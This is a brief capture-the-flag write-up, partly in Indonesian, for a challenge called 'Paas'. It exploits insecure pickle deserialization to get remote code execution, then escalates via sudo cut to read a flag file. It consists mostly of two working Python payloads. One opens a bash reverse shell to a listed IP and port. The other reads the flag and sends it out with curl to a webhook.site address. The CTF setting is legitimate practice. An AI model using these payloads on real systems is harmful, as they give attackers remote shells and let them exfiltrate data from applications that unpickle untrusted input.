# Writeup Paas

pickle insecure deserialization to get RCE then priv esc using sudo cut

ada 2 cara sih sebenernya

1. dapetin revshell(ud nyoba pake run docker locally bs tp nda tau klo di vm bs ga/perlu ngrok)
```python
import pickle
import os
import base64

class Exploit:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/172.25.35.224/9001 0>&1'"
        return (os.system, (cmd,))

payload = pickle.dumps(Exploit())
print(base64.urlsafe_b64encode(payload).decode())
```

abis itu tinggal 
``sudo cut -c 1-100 /flag.txt``

2. Pake webhook
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        cmd = (
            "sudo cut -c 1-100 /flag.txt | "
            "curl -X POST -d @- https://webhook.site/ee8b26af-e38c-4a3c-9008-66821aa30c70"
        )
        return (os.system, (cmd,))

payload = pickle.dumps(Exploit())
print(base64.urlsafe_b64encode(payload).decode())
```
